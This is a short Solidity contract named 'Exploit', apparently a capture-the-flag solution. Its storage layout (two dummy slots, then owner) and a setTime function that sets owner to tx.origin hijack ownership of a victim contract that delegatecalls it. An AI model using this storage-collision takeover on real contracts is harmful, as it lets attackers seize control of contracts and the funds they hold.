pragma solidity ^0.4.23;

contract Exploit {
    
    address public dummy1;
    address public dummy2;
    address public owner; 
    
    function setTime(uint _time) public {
        owner = tx.origin;
    }
    
}